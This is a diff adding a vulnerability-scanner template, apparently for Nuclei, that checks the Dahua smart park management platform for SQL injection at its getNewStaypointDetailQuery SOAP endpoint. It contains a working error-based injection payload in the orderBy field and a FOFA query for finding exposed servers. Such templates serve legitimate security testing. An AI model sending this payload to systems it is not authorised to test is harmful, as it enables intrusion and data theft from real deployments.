@@ -1,0 +1,49 @@
+
+id: dahua-getNewStaypointDetailQuery-sqli
+info:
+  name: 大华智慧园区综合管理平台-getNewStaypointDetailQuery-SQL注入
+  author: recjl
+  severity: high
+  description: '大华智慧园区综合管理平台 getNewStaypointDetailQuery SQL注入，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。'
+  reference:
+    - https://mp.weixin.qq.com/s/4mlJCpIQksWdP5mIdNRq7Q
+  tags: 2024,大华,sqli
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query:  body="/WPMS"
+  classification:
+    cvss-metrics: 
+    cvss-score:                                                   
+    cve-id:                                              
+    cwe-id:                                                    
+    epss-score:                                              
+    epss-percentile:                                           
+    cpe:
+requests:
+  - raw:
+      - |
+        POST /portal/services/carQuery/getNewStaypointDetailQuery HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 497
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <car:getNewStaypointDetailQuery>
+        <!--type: string-->
+        <searchJson>{}</searchJson>
+        <!--type: string-->
+        <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select user()),0x7e),1)--"}</pageJson>
+        <!--type: string-->
+        <extend>quae divum incedo</extend>
+        </car:getNewStaypointDetailQuery>
+        </soapenv:Body>
+        </soapenv:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - SQL
